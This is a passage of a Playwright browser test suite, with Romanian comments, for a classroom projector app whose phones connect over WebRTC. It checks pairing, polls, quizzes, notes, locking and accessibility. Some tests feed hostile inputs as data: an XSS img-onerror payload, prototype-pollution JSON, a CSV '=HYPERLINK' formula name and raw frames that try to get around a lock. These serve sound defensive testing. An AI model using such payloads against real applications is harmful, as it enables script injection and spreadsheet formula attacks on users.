// Teste în browser real pentru «Proiector fără frontiere» (Playwright, rețea blocată): pagina, sesiunea cu 2–3 telefoane prin WebRTC (pe aceeași mașină),
// cele cinci activități, blocarea/scoaterea/încheierea, limbă și temă, accesibilitate, ecran mic — și apărarea: widget ostil în sandbox, abuz pe portul widgetului,
// inundații, telefon ostil și proiector ostil prin canalul de date.
// Rulare: node tests/proiector.test.mjs [A|B|C|D|B7|parte-din-nume] [--root DIR]
// Depozitul aplicației: --root DIR, FFF_ROOT sau directorul părinte al hub-ului (lipsa lui se omite cu mesaj). Cerințe: playwright + Chromium (CHROMIUM_PATH), axe-core (FFF_AXE).
// Pentru WebRTC între pagini de pe aceeași mașină, Chromium pornește cu --allow-loopback-in-peer-connection și fără ascunderea adreselor locale prin mDNS.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {spawnSync} from 'node:child_process';
import {fileURLToPath} from 'node:url';
import {chromium, newPage, axe, AXE} from '../fff-kit/test/_pw.mjs';

const HUB = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const args = process.argv.slice(2);
const ri = args.indexOf('--root');
const rootArg = ri >= 0 ? args.splice(ri, 2)[1] : null;
const ROOT = path.resolve(rootArg || process.env.FFF_ROOT || path.join(HUB, '..'));
const only = args[0];
const APP = path.join(ROOT, 'proiector-fara-frontiere');
const PAGE = path.join(APP, 'index.html');
const LANGS = ['en', 'ro', 'fr', 'it', 'es', 'pt', 'de', 'hu'];
const RAW_KEY = /\b[a-z]{2,8}_[a-z0-9_]{2,}\b/;     // chei de traducere rămase în text (snake_case)
const BAD_TEXT = /\bNaN\b|\bundefined\b|\bnull\b|\bInfinity\b|\[object /;
const FLAGS = ['--no-sandbox', '--allow-loopback-in-peer-connection', '--disable-features=WebRtcHideLocalIpsWithMdns'];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

if (!fs.existsSync(PAGE)) { console.log('omis: proiector-fara-frontiere (nu există ' + path.relative(HUB, PAGE) + ')'); process.exit(0); }

const results = [];
const open = [];
async function T(name, fn) {
  const id = name.split(' ')[0];
  if (only && !only.split(',').some((f) => /^[A-Z]$/.test(f) ? id[0] === f : /^[A-Z]\d+$/.test(f) ? id === f : name.includes(f))) return;     // «B» = grupa B, «B7» = un test, «B3,B4» = mai multe, altfel parte din nume
  const t0 = Date.now();
  try { await fn(); results.push([name, true]); console.log('ok   ' + name + ' (' + (Date.now() - t0) + ' ms)'); }
  catch (e) { results.push([name, false]); console.log('FAIL ' + name + '\n       ' + String(e.stack || e).split('\n').slice(0, 7).join('\n       ')); }
  for (const h of open.splice(0)) await h.ctx.close().catch(() => {});      // fiecare test pornește curat; conexiunile WebRTC rămase încarcă mașina și fac testele nesigure
}
const ok = (c, m) => { if (!c) throw new Error(typeof m === 'string' ? m : JSON.stringify(m)); };
const eq = (a, b, m) => { if (a !== b) throw new Error((m || 'diferă') + ': așteptat ' + JSON.stringify(b) + ', primit ' + JSON.stringify(a)); };
const noErr = (hs, what) => { for (const h of [].concat(hs)) { ok(h.errors.length === 0, (what || 'erori') + ': ' + h.errors.join(' | ')); ok(h.net.length === 0, 'cereri de rețea: ' + h.net.join(', ')); } };

let browser;
/** Pagină nouă (rețea blocată, erori colectate) cu aplicația încărcată și limba setată. */
async function start(o = {}) {
  const h = await newPage(browser, Object.assign({locale: 'en-US'}, o));
  await h.ctx.addInitScript(TRAFFIC);
  if (o.init) await h.ctx.addInitScript(o.init.fn, o.init.arg);
  await h.page.goto('file://' + (o.file || PAGE));
  await h.page.waitForSelector('#appmount .pf-roles');
  if (o.lang !== null) { await h.page.selectOption('#langsel', o.lang || 'en'); await h.page.waitForSelector('#appmount .pf-roles'); }
  open.push(h);
  return h;
}
const D = (p, role) => p.locator('[data-role=' + role + ']');
/** Jurnal al cadrelor de pe canalele de date (doar tipul, nu conținutul): se citește din mesajele de eroare ale testelor, ca o cursă rară să poată fi diagnosticată din rularea care a prins-o. */
const TRAFFIC = () => {
  window.__tl = []; const T0 = Date.now();
  const log = (dir, c, d) => { try { const o = JSON.parse(d); if (o && !o._fff) { window.__tl.push((Date.now() - T0) + dir + c.label + ':' + o.t + (o.w ? '/' + o.w : '') + (o.n != null ? '#' + o.n : '') + '(' + c.readyState + ')'); if (window.__tl.length > 80) window.__tl.shift(); } } catch (e) { /* ignorat */ } };
  const keep = (c) => { c.addEventListener('message', (e) => log('<', c, e.data)); const s = c.send; c.send = function (d) { log('>', c, d); return s.apply(this, arguments); }; };
  const orig = RTCPeerConnection.prototype.createDataChannel;
  RTCPeerConnection.prototype.createDataChannel = function () { const c = orig.apply(this, arguments); keep(c); return c; };
  const desc = Object.getOwnPropertyDescriptor(RTCPeerConnection.prototype, 'ondatachannel');
  if (desc && desc.set) Object.defineProperty(RTCPeerConnection.prototype, 'ondatachannel', { set(f) { desc.set.call(this, f && ((e) => { keep(e.channel); return f.call(this, e); })); }, get: desc.get, configurable: true });
};
/** Împerechează un telefon cu proiectorul prin dialogul real (coduri lipite ca text); proiectorul trebuie să fie deja în sesiune. */
async function pair(host, guest, name) {
  const A = host.page, B = guest.page;
  const n = (await A.$$('.pf-peer')).length;                                  // înainte de împerechere: după conectare telefonul poate fi deja în listă
  if (name) await B.fill('#pf-name', name);
  await A.click('[data-fid=add]'); await D(A, 'p2p-dialog').waitFor(); await D(A, 'optin').check(); await D(A, 'mode-host').click(); await D(A, 'gen-offer').click();
  await D(A, 'offer-out').waitFor(); const offer = await D(A, 'offer-out').inputValue();
  await B.click('#pf-start-guest'); await D(B, 'p2p-dialog').waitFor(); await D(B, 'optin').check(); await D(B, 'mode-join').click();
  await D(B, 'offer-in').fill(offer); await D(B, 'gen-answer').click();
  await D(B, 'answer-out').waitFor(); const answer = await D(B, 'answer-out').inputValue();
  await D(A, 'answer-in').fill(answer); await D(A, 'connect').click();
  await B.waitForSelector('.pf-live', {timeout: 25000});
  await A.waitForFunction((k) => document.querySelectorAll('.pf-peer').length > k, n, {timeout: 15000});
}
/** Proiector + n telefoane împerecheate; telefoanele au ecran de 390 px. */
async function session(n = 1, o = {}) {
  const H = await start(o.host);
  await H.page.click('#pf-start-host'); await H.page.waitForSelector('.pf-live');
  const Gs = [];
  for (let i = 0; i < n; i++) {
    const G = await start(Object.assign({w: 390, h: 780}, o.guest));
    await pair(H, G, (o.names || ['Ana', 'Bogdan', 'Cora', 'Dan'])[i]);
    Gs.push(G);
  }
  return {H, Gs};
}
const frameOf = async (h) => { const e = await h.page.$('.pf-frame'); return e ? e.contentFrame() : null; };
/** Așteaptă (cu interogare) ca fn(frame) să devină adevărată; întoarce cadrul reînnoit la fiecare încercare (cadrul se schimbă când se schimbă activitatea). */
async function untilIn(h, fn, arg, what, ms = 8000) {
  const t0 = Date.now(); let last;
  while (Date.now() - t0 < ms) {
    const f = await frameOf(h);
    if (f) { try { last = await f.evaluate(fn, arg); if (last) return last; } catch (e) { /* cadrul se reîncarcă */ } }
    await sleep(60);
  }
  throw new Error('timp expirat: ' + (what || String(fn)).slice(0, 900) + ' (ultima valoare: ' + JSON.stringify(last) + ')');
}
const rootText = (f) => f.evaluate(() => document.getElementById('root').innerText.replace(/\s+/g, ' ').trim());
const textOf = async (h) => { const f = await frameOf(h); return f ? rootText(f) : ''; };
/** Starea vizibilă a unei pagini, pentru mesajele de eroare ale testelor (ce vedea utilizatorul când a expirat așteptarea). */
const peek = (P) => P.page.evaluate(() => { const l = document.querySelector('.pf-live'); const q = (s) => { const e = document.querySelector(s); return e ? (e.hidden ? '(ascuns) ' : '') + e.textContent.replace(/\s+/g, ' ').trim().slice(0, 90) : '-'; }; return l ? 'stare=' + q('.pf-state') + ' | telefoane=' + [...document.querySelectorAll('.pf-peer')].map((e) => e.textContent.replace(/\s+/g, ' ').slice(0, 24)).join('/') + ' | inactiv=' + q('.pf-idle') + ' | banner=' + q('.pf-banner') + ' | cadre=' + document.querySelectorAll('.pf-frame').length + ' | trafic=' + (window.__tl || []).slice(-14).join(' ') : 'fără strat live: ' + document.querySelector('#appmount').textContent.replace(/\s+/g, ' ').slice(0, 120); }).catch((e) => 'peek: ' + e.message.slice(0, 60));
const openAct = async (H, Gs, id) => {
  await H.page.click('[data-fid=a-' + id + ']');
  for (const P of [H].concat(Gs)) {
    try { await P.page.waitForSelector('.pf-frame', {timeout: 12000}); }
    catch (e) { throw new Error('activitatea ' + id + ' nu a apărut pe ' + (P === H ? 'proiector' : 'telefon') + ' în 12 s — proiector: ' + await peek(H) + ' || telefoane: ' + (await Promise.all(Gs.map(peek))).join(' ; ') + ' || erori: ' + [H].concat(Gs).map((x) => x.errors.join('/')).join(' ; ')); }
  }
  for (const P of [H].concat(Gs)) await untilIn(P, () => !!document.querySelector('#root > *'), null, 'activitatea ' + id + ' nu s-a încărcat');
};
/** Clic cu verificarea efectului. Chromium poate pierde (la nivelul introducerii) primul clic dat imediat după o schimbare de aspect — un iframe proaspăt inserat, un <details> deschis;
    în jurnalul de evenimente al paginii clicul pur și simplu lipsește. Se repetă până apare efectul (cel mult de 4 ori); starea se verifică înainte de fiecare încercare, deci comutatoarele nu se dublează. */
const clickUntil = async (P, sel, done, tries = 4) => {
  for (let i = 0; i < tries; i++) { if (await P.page.evaluate(done, sel)) return; await P.page.click(sel); await sleep(300); }
  if (!(await P.page.evaluate(done, sel))) throw new Error('clicul pe ' + sel + ' nu a avut efect după ' + tries + ' încercări');
};
const isOpen = () => !!(document.querySelector('details.pf-look') || {}).open;
const isPressed = (s) => { const b = document.querySelector(s); return !!b && b.getAttribute('aria-pressed') === 'true'; };
const settle = (p) => p.evaluate(() => Promise.race([
  Promise.all(document.getAnimations().filter((a) => { try { return !!a.effect && isFinite(a.effect.getComputedTiming().endTime); } catch (e) { return false; } }).map((a) => a.finished.catch(() => null))),
  new Promise((r) => setTimeout(r, 4000))]).then(() => null));
const AXE_SRC = fs.readFileSync(AXE, 'utf8') + '\n;0';

/* ===================== A. pagina, texte, stare ostilă, accesibilitate, ecran mic ===================== */
async function partA() {
  await T('A1 · se încarcă în toate limbile: fără erori CSP/rețea, chei netraduse sau text invalid', async () => {
    const h = await start();
    for (const l of LANGS) {
      await h.page.selectOption('#langsel', l); await h.page.waitForSelector('#appmount .pf-roles');
      const info = await h.page.evaluate(() => ({lang: document.documentElement.lang, text: document.querySelector('#appmount').innerText, h2: (document.querySelector('#app h2') || {}).textContent || '', btn: [...document.querySelectorAll('#appmount button')].map((b) => b.textContent.trim())}));
      eq(info.lang, l, 'atribut lang'); ok(info.h2.length > 3, l + ': titlu lipsă'); ok(info.btn.length >= 2 && info.btn.every(Boolean), l + ': butoane fără text');
      const raw = info.text.match(RAW_KEY); ok(!raw, l + ': cheie netradusă «' + (raw && raw[0]) + '»');
      const bad = info.text.match(BAD_TEXT); ok(!bad, l + ': text invalid «' + (bad && bad[0]) + '»');
    }
    noErr(h);
  });

  await T('A2 · stare salvată coruptă sau ostilă nu strică pagina și nu ajunge în interfață ca marcaj', async () => {
    const hostile = ['not json', 'null', '[]', '5', '{"name":5,"hc":"x","xl":[],"cid":{"a":1}}', '{"name":"<img src=x onerror=alert(1)>","cid":"' + 'x'.repeat(5000) + '"}', '{"__proto__":{"polluted":1},"name":"a"}', '{"name":"\\u202etxt\\u200b\\u0007 x"}'];
    for (const v of hostile) {
      const h = await start({init: {fn: (a) => { try { localStorage.setItem(a[0], a[1]); } catch (e) { /* ignorat */ } }, arg: ['proiector-fara-frontiere.settings', v]}});
      const r = await h.page.evaluate(() => ({name: document.querySelector('#pf-name').value, polluted: ({}).polluted, imgs: document.querySelectorAll('#appmount img').length}));
      ok(r.name.length <= 24 && !/[\u0000-\u001f\u200b-\u200f\u202a-\u202e]/.test(r.name), 'nume nesanitizat pentru ' + v.slice(0, 30) + ': ' + JSON.stringify(r.name));
      eq(r.polluted, undefined, 'poluare de prototip'); eq(r.imgs, 0, 'element injectat');
      noErr(h, v.slice(0, 30)); await h.ctx.close();
    }
  });

  await T('A3 · fără rol ales: axe în ambele teme, ordine de focalizare și etichete', async () => {
    for (const scheme of ['light', 'dark']) {
      const h = await start({scheme}); await h.page.evaluate(() => document.querySelector('#app').scrollIntoView()); await settle(h.page);
      const v = await axe(h.page, '#appmount'); ok(v.length === 0, scheme + ': ' + JSON.stringify(v));
      const f = await h.page.evaluate(() => [...document.querySelectorAll('#appmount button, #appmount input, #appmount select, #appmount a')].map((e) => ({t: e.tagName, label: (e.getAttribute('aria-label') || e.labels && e.labels[0] && e.labels[0].textContent || e.textContent || '').trim()})));
      ok(f.length >= 3 && f.every((x) => x.label), 'elemente fără etichetă: ' + JSON.stringify(f));
      noErr(h); await h.ctx.close();
    }
  });

  await T('A4 · 360 px: fără depășire orizontală (ecranul de rol, proiector, telefon, fiecare activitate)', async () => {
    const probe = (p) => p.evaluate(() => ({doc: document.documentElement.scrollWidth, win: innerWidth, over: [...document.querySelectorAll('.pf-live *, #appmount *')].filter((e) => { const r = e.getBoundingClientRect(); return r.width > 0 && r.right > innerWidth + 1; }).map((e) => e.tagName.toLowerCase() + '.' + String(e.className).slice(0, 30)).slice(0, 4)}));
    const small = {w: 360, h: 740};
    const h0 = await start(small); let m = await probe(h0.page); ok(m.doc <= m.win && m.over.length === 0, 'rol: ' + JSON.stringify(m));
    const {H, Gs} = await session(1, {host: small, guest: small});
    m = await probe(H.page); ok(m.doc <= m.win && m.over.length === 0, 'proiector: ' + JSON.stringify(m));
    for (const id of ['timer', 'poll', 'quiz', 'notes', 'whiteboard']) {
      await openAct(H, Gs, id);
      for (const P of [H, Gs[0]]) {
        m = await probe(P.page); ok(m.doc <= m.win && m.over.length === 0, id + ': ' + JSON.stringify(m));
        const fr = await frameOf(P); const w = await fr.evaluate(() => ({doc: document.documentElement.scrollWidth, win: innerWidth})); ok(w.doc <= w.win + 1, id + ' (în cadru): ' + JSON.stringify(w));
      }
    }
    const tiny = await Gs[0].page.$$eval('.pf-live button', (b) => b.map((x) => { const r = x.getBoundingClientRect(); return [Math.round(r.width), Math.round(r.height)]; }).filter(([w, hh]) => w > 0 && (w < 24 || hh < 24)));
    ok(tiny.length === 0, 'butoane sub 24×24 px: ' + JSON.stringify(tiny));
    noErr([h0, H].concat(Gs));
  });

  await T('A5 · sesiune pornită: axe pe stratul proiectorului și al telefonului (temă deschisă, închisă, contrast ridicat)', async () => {
    const {H, Gs} = await session(1);
    await openAct(H, Gs, 'poll');
    for (const mode of ['light', 'dark', 'hc']) {
      if (mode === 'hc' && !(await H.page.$('.pf-live.pf-hc'))) { for (const P of [H, Gs[0]]) { await clickUntil(P, '[data-fid=look]', isOpen); await clickUntil(P, '[data-fid=hc]', isPressed); ok(await P.page.$('.pf-live.pf-hc'), 'contrastul ridicat nu s-a aplicat'); } }
      else if (mode !== 'hc') { for (const P of [H, Gs[0]]) await P.page.evaluate((m) => document.documentElement.setAttribute('data-theme', m), mode); }
      await sleep(300);
      for (const P of [H, Gs[0]]) {
        await settle(P.page);
        const v = await axe(P.page, '.pf-live'); ok(v.length === 0, mode + ' (' + (P === H ? 'proiector' : 'telefon') + '): ' + JSON.stringify(v));
        const fr = await frameOf(P);
        await fr.evaluate(AXE_SRC);                                          // evaluare de șir prin CDP: nu e supusă CSP-ului cadrului (spre deosebire de eval din pagină)
        const inner = await fr.evaluate(async () => { const r = await window.axe.run(document.getElementById('root'), {resultTypes: ['violations']}); return r.violations.map((x) => x.id + ':' + x.nodes.length); });   // doar conținutul widgetului: regulile de pagină (main, h1, region) țin de pagina-gazdă
        ok(inner.length === 0, mode + ' (cadru ' + (P === H ? 'proiector' : 'telefon') + '): ' + JSON.stringify(inner));
      }
    }
    noErr([H].concat(Gs));
  });
}

/* ===================== B. sesiune: împerechere, activități, blocare, limbă, ieșire ===================== */
async function partB() {
  await T('B1 · împerechere: nume, culoare, listă; starea apare la ambele capete; fără erori', async () => {
    const {H, Gs} = await session(2);
    const names = await H.page.$$eval('.pf-pn', (l) => l.map((e) => e.textContent.trim()));
    eq(names.join('|'), 'Ana|Bogdan');
    for (const G of Gs) { ok((await G.page.textContent('.pf-live')).length > 10); ok(await G.page.$('.pf-badge'), 'insignă lipsă'); }
    noErr([H].concat(Gs));
  });

  await T('B2 · cronometru: pornit de proiector, telefoanele arată același timp (±2 s); pauză și resetare', async () => {
    const {H, Gs} = await session(2); await openAct(H, Gs, 'timer');
    const hf = await frameOf(H);
    await hf.fill('#tm-m', '2'); await hf.fill('#tm-s', '0'); await hf.click('text=Set time'); await hf.click('text=Start');
    const clock = async (P) => (await untilIn(P, () => { const m = document.getElementById('root').innerText.match(/\d\d:\d\d/); return m && m[0]; }, null, 'ceas')).split(':').reduce((a, b) => a * 60 + +b, 0);
    await sleep(1500);
    const t = await Promise.all([H].concat(Gs).map(clock));
    ok(Math.max(...t) - Math.min(...t) <= 2 && Math.max(...t) <= 120 && Math.min(...t) >= 110, 'ceasuri: ' + JSON.stringify(t));
    await hf.click('text=Pause'); await sleep(900);
    const p1 = await clock(Gs[0]); await sleep(1200); const p2 = await clock(Gs[0]); eq(p1, p2, 'în pauză ceasul nu trebuie să scadă');
    await hf.click('text=Reset'); await sleep(500); ok((await clock(Gs[1])) >= 119, 'resetare');
    ok(!/Start|Pause|Reset/.test(await textOf(Gs[0])), 'telefonul nu are comenzile cronometrului');
    noErr([H].concat(Gs));
  });

  await T('B3 · sondaj: un vot pe telefon (al doilea îl înlocuiește, nu îl adună), rezultate la toți, CSV', async () => {
    const {H, Gs} = await session(2); await openAct(H, Gs, 'poll');
    const hf = await frameOf(H);
    await hf.fill('#pl-q', 'Care e preferata?'); await hf.fill('#pl-o0', 'Rosu'); await hf.fill('#pl-o1', 'Albastru'); await hf.click('text=Start poll');
    for (const G of Gs) await untilIn(G, () => document.querySelectorAll('button.pl-opt').length === 2, null, 'variante');
    await (await frameOf(Gs[0])).click('button.pl-opt >> nth=0'); await (await frameOf(Gs[1])).click('button.pl-opt >> nth=1');
    await untilIn(H, () => /2 of 2 phones have voted/.test(document.getElementById('root').innerText), null, 'host: 2 din 2');
    await (await frameOf(Gs[0])).click('button.pl-opt >> nth=1').catch(() => {});    // schimbare de vot, dacă e permisă; numărul de votanți rămâne 2
    await sleep(500); ok(/2 of 2 phones have voted/.test(await textOf(H)), 'numărul de votanți: ' + await textOf(H));
    const dl = H.page.waitForEvent('download', {timeout: 8000});
    await hf.click('text=Close voting'); await hf.click('text=Save results (CSV)');
    const d = await dl; eq(d.suggestedFilename(), 'poll.csv');
    const csv = fs.readFileSync(await d.path(), 'utf8').replace(/^\ufeff/, '');
    ok(/^question,option,votes\r\n"?Care e preferata\?"?,Rosu,\d\r\n"?Care e preferata\?"?,Albastru,\d\r\n$/.test(csv), JSON.stringify(csv));
    noErr([H].concat(Gs));
  });

  await T('B4 · quiz: răspunsul corect nu ajunge la telefon înainte de «Arată răspunsul»; clasament; CSV cu nume-formulă neutralizat', async () => {
    const {H, Gs} = await session(2, {names: ['=HYPERLINK("http://e.test","x")', 'Bogdan']}); await openAct(H, Gs, 'quiz');
    const hf = await frameOf(H);
    await hf.click('text=Insert a sample'); await hf.click('text=Check quiz'); await hf.click('text=Start quiz');
    for (const G of Gs) await untilIn(G, () => document.querySelectorAll('button.qz-opt').length >= 3, null, 'opțiuni quiz');
    for (const G of Gs) ok(!/Basic addition/.test(await textOf(G)), 'explicația a apărut înainte de dezvăluire');   // răspunsul corect rămâne la proiector până la «Show answer»
    await (await frameOf(Gs[0])).click('button.qz-opt >> nth=1'); await (await frameOf(Gs[1])).click('button.qz-opt >> nth=0');
    await untilIn(H, () => /2/.test(document.getElementById('root').innerText), null, 'răspunsuri primite'); await sleep(500);
    await hf.click('text=Show answer');
    for (const G of Gs) await untilIn(G, () => /Basic addition/.test(document.getElementById('root').innerText), null, 'dezvăluire');
    const btn = async () => (await hf.$$eval('button', (l) => l.filter((b) => !b.disabled).map((b) => b.textContent.trim()))).find((b) => /Next|Finish|Results|End/i.test(b));
    await hf.click('text=' + await btn());
    await untilIn(H, () => /Which are prime/.test(document.getElementById('root').innerText), null, 'a doua întrebare');
    await (await frameOf(Gs[0])).click('button.qz-opt >> nth=1'); await (await frameOf(Gs[1])).click('button.qz-opt >> nth=1');
    await sleep(600); await hf.click('text=Show answer'); await sleep(500); await hf.click('text=' + await btn());
    await untilIn(H, () => document.getElementById('root').innerText.includes('Bogdan'), null, 'clasament');
    const dl = H.page.waitForEvent('download', {timeout: 8000});
    await hf.click('text=Save results (CSV)'); const d = await dl;
    const csv = fs.readFileSync(await d.path(), 'utf8').replace(/^\ufeff/, '');
    ok(/^rank,name,score\r\n/.test(csv), csv.slice(0, 40));
    ok(!/(^|,|\n)"?=HYPERLINK/.test(csv) && /"'=HYPERLINK/.test(csv), 'formula din nume neneutralizată: ' + JSON.stringify(csv));
    noErr([H].concat(Gs));
  });

  await T('B5 · note: textul rămâne text (HTML nu se execută), un telefon își poate șterge doar notele; export text', async () => {
    const {H, Gs} = await session(2); await openAct(H, Gs, 'notes');
    const evil = '<img src=x onerror="window.__x=1"><b>gros</b> ' + 'a'.repeat(200);
    const gf = await frameOf(Gs[0]); await gf.fill('#nt-ta', evil); await gf.click('text=Add note');
    await untilIn(H, () => document.querySelectorAll('.nt-grid li').length === 1, null, 'nota ajunge la proiector');
    const hf = await frameOf(H);
    const r = await hf.evaluate(() => ({img: document.querySelectorAll('img, b').length, x: window.__x, txt: document.querySelector('.nt-grid li').textContent}));
    eq(r.img, 0, 'element HTML injectat'); eq(r.x, undefined); ok(r.txt.includes('<img src=x') && r.txt.length < 260, 'text trunchiat/curățat: ' + r.txt.length);
    await untilIn(Gs[1], () => document.querySelectorAll('.nt-grid li').length === 1, null, 'nota ajunge la celălalt telefon');
    ok(!(await (await frameOf(Gs[1])).$('.nt-del')), 'celălalt telefon nu are voie să șteargă nota altuia');
    const dl = H.page.waitForEvent('download', {timeout: 8000}); await hf.click('text=Save as text'); const d = await dl;
    ok(/^Ana: <img src=x/.test(fs.readFileSync(await d.path(), 'utf8')), 'export text');
    noErr([H].concat(Gs));
  });

  await T('B6 · tablă: desenul unui telefon apare la proiector și la celălalt telefon; PNG valid; fără cheie de desen în afara tablei', async () => {
    const {H, Gs} = await session(2); await openAct(H, Gs, 'whiteboard');
    const stroke = async (P, pts) => { const cv = await (await frameOf(P)).$('canvas'); const b = await cv.boundingBox(); await P.page.mouse.move(b.x + pts[0][0] * b.width, b.y + pts[0][1] * b.height); await P.page.mouse.down(); for (const p of pts.slice(1)) await P.page.mouse.move(b.x + p[0] * b.width, b.y + p[1] * b.height, {steps: 4}); await P.page.mouse.up(); };
    await stroke(Gs[0], [[.2, .3], [.5, .6], [.8, .3]]);
    const ink = () => (P) => untilIn(P, () => { const cv = document.querySelector('canvas'); const d = cv.getContext('2d').getImageData(0, 0, cv.width, cv.height).data; let n = 0; for (let i = 3; i < d.length; i += 4) if (d[i] > 0) n++; return n > 200 && n; }, null, 'cerneală');
    for (const P of [H, Gs[0], Gs[1]]) ok((await ink()(P)) > 200);
    const dl = H.page.waitForEvent('download', {timeout: 8000}); await (await frameOf(H)).click('text=Save as image'); const d = await dl;
    const png = fs.readFileSync(await d.path()); eq(png.subarray(1, 4).toString(), 'PNG'); ok(png.length > 2000);
    noErr([H].concat(Gs));
  });

  await T('B7 · blocare: banner pe telefonul blocat, vot respins de proiector (și cadru brut), deblocarea reface totul, «blochează toate» atinge toți', async () => {
    const H = await start(); await H.page.click('#pf-start-host'); await H.page.waitForSelector('.pf-live');
    const G1 = await start({w: 390, h: 780, init: {fn: HOOK, arg: null}}); await pair(H, G1, 'Ana');
    const G2 = await start({w: 390, h: 780}); await pair(H, G2, 'Bogdan');
    const Gs = [G1, G2]; await openAct(H, Gs, 'poll');
    const hf = await frameOf(H); await hf.fill('#pl-q', 'Q?'); await hf.fill('#pl-o0', 'A'); await hf.fill('#pl-o1', 'B'); await hf.click('text=Start poll');
    for (const G of Gs) await untilIn(G, () => document.querySelectorAll('button.pl-opt').length === 2, null, 'variante');
    const banner = (G) => G.page.evaluate(() => { const b = document.querySelector('.pf-banner'); return !!b && !b.hidden && b.textContent.trim().length > 3; });
    const tally = async () => (/(\d) of (\d) phones have voted/.exec(await textOf(H)) || [])[1];
    ok(!(await banner(G1)) && !(await banner(G2)), 'banner afișat fără blocare');
    const lock1 = H.page.locator('.pf-peer').nth(0).locator('[data-fid^="l-"]');
    await lock1.click();
    await G1.page.waitForFunction(() => { const b = document.querySelector('.pf-banner'); return b && !b.hidden && b.textContent.trim().length > 3; }, null, {timeout: 8000});
    ok(!(await banner(G2)), 'celălalt telefon a primit bannerul de blocare');
    // votul prin interfața widgetului (ignorat de widget) și prin cadru brut (respins de proiector)
    await (await frameOf(G1)).click('button.pl-opt >> nth=0', {force: true, timeout: 1500}).catch(() => {});
    const open = await G1.page.evaluate(() => window.__open); ok(open && open.w === 'poll' && Number.isInteger(open.n), 'nu s-a prins mesajul «open»: ' + JSON.stringify(open));
    const vote = (i) => ({t: 'w', w: open.w, n: open.n, to: 'host', j: JSON.stringify({k: 'vote', i})});
    ok((await rawSend(G1.page, [vote(0), vote(1), vote(0)])) === 3, 'cadrele nu s-au trimis');
    await sleep(900); eq(await tally(), '0', 'un vot de la un telefon blocat a fost numărat: ' + await textOf(H));
    await (await frameOf(G2)).click('button.pl-opt >> nth=1'); await untilIn(H, () => /1 of 2 phones have voted/.test(document.getElementById('root').innerText), null, 'votul telefonului neblocat');
    await lock1.click();                                                                  // același buton: deblocare
    await G1.page.waitForFunction(() => { const b = document.querySelector('.pf-banner'); return !b || b.hidden; }, null, {timeout: 8000});
    ok((await rawSend(G1.page, [vote(0)])) === 1);                                         // același cadru brut, acum acceptat: dovedește că respingerea de mai sus a fost din cauza blocării
    await untilIn(H, () => /2 of 2 phones have voted/.test(document.getElementById('root').innerText), null, 'cadrul brut ar fi trebuit acceptat după deblocare');
    await H.page.click('[data-fid=lockall]');
    for (const G of Gs) await G.page.waitForFunction(() => { const b = document.querySelector('.pf-banner'); return b && !b.hidden; }, null, {timeout: 8000});
    ok((await H.page.getAttribute('[data-fid=lockall]', 'aria-pressed')) === 'true', 'butonul «blochează toate» nu arată starea');
    await H.page.click('[data-fid=lockall]');
    for (const G of Gs) await G.page.waitForFunction(() => { const b = document.querySelector('.pf-banner'); return !b || b.hidden; }, null, {timeout: 8000});
    noErr([H].concat(Gs));
  });

  await T('B8 · limbă și temă: telefonul își alege limba fără s-o schimbe pe a proiectorului; contrast ridicat și text mare ajung în widget', async () => {
    const {H, Gs} = await session(1, {host: {init: {fn: CLICKLOG, arg: null}}}); await openAct(H, Gs, 'poll');
    await clickUntil(Gs[0], '[data-fid=look]', isOpen);
    await Gs[0].page.locator('.pf-sel').focus(); await Gs[0].page.selectOption('.pf-sel', 'ro');
    await untilIn(Gs[0], () => document.documentElement.lang === 'ro', null, 'widget în română');
    eq(await H.page.evaluate(() => document.documentElement.lang), 'en', 'limba proiectorului s-a schimbat');
    eq(await Gs[0].page.evaluate(() => document.documentElement.lang), 'ro');
    ok(!/Poll/.test(await textOf(Gs[0])) || /Sondaj/.test(await textOf(Gs[0])), 'widgetul telefonului nu este tradus: ' + await textOf(Gs[0]));
    await sleep(300); eq(await Gs[0].page.evaluate(() => document.activeElement && document.activeElement.getAttribute('data-fid')), 'lang', 'focalizarea trebuie să rămână pe selectorul de limbă după refacerea barei');
    await clickUntil(H, '[data-fid=look]', isOpen); await clickUntil(H, '[data-fid=hc]', isPressed); await clickUntil(H, '[data-fid=xl]', isPressed);
    const ck = () => H.page.evaluate(() => window.__ck.slice(-24)).then((l) => l.join(' ; '));
    await untilIn(H, () => document.documentElement.classList.contains('t-hc') && document.documentElement.classList.contains('t-xl'), null, 'tema trimisă widgetului; jurnal clicuri: ' + await ck(), 12000);
    // și telefonul își păstrează propria temă (a proiectorului nu s-a transmis)
    ok(!(await frameOf(Gs[0]).then((f) => f.evaluate(() => document.documentElement.classList.contains('t-hc')))), 'tema proiectorului s-a propagat pe telefon');
    noErr([H].concat(Gs));
  });

  await T('B9 · ieșire și revenire (același telefon își recapătă numele), scoatere de către proiector, încheiere în două clicuri', async () => {
    const {H, Gs} = await session(1); await openAct(H, Gs, 'notes');
    await Gs[0].page.click('[data-fid=end]');                                   // telefonul: «Leave»
    await Gs[0].page.waitForSelector('.pf-live', {state: 'detached', timeout: 8000});
    await H.page.waitForFunction(() => document.querySelectorAll('.pf-peer').length === 0, null, {timeout: 8000});
    await pair(H, Gs[0]);                                                      // aceeași pagină, același cid, același nume
    eq((await H.page.$$eval('.pf-pn', (l) => l.map((e) => e.textContent.trim()))).join('|'), 'Ana', 'numele nu s-a păstrat');
    await H.page.click('[data-fid=r-p1]'); await Gs[0].page.waitForSelector('.pf-live', {state: 'detached', timeout: 8000});
    ok(/scos|removed/i.test(await Gs[0].page.textContent('#appmount')), 'mesajul de scoatere lipsește');
    await H.page.waitForFunction(() => document.querySelectorAll('.pf-peer').length === 0, null, {timeout: 8000});   // proiectorul închide sesiunea veche la 200 ms după „bye”; până atunci lista încă îl arată
    await pair(H, Gs[0]);
    await H.page.click('[data-fid=end]'); ok(/again|din nou|erneut|nuevo|nouveau|nuovamente|novamente|újra/i.test(await H.page.textContent('[data-fid=end]')), 'prima apăsare cere confirmare');
    await H.page.click('[data-fid=end]');
    await H.page.waitForSelector('.pf-live', {state: 'detached', timeout: 8000}); await Gs[0].page.waitForSelector('.pf-live', {state: 'detached', timeout: 8000});
    noErr([H].concat(Gs));
  });

  await T('B10 · trei telefoane: tot ce se trimite «către toți» ajunge la toți; un telefon nu vede răspunsurile altuia', async () => {
    const {H, Gs} = await session(3); await openAct(H, Gs, 'notes');
